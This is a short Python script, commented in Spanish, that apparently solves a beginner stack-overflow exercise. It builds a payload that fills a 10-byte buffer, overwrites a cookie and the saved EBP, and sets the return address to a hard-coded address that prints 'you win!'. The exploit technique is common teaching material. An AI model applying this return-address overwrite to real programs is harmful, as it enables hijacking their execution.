from struct import pack

ret_addr = 0x0804849c           # Direccion de printf("you win!")

output = "A" * 10               # Sobreescribe buff
output += "BBBB"                # Sobreescribe cookie
output += "CCCC"                # Sobreescribe ebp
output += pack("<I", ret_addr)  # Establece return address

print(output)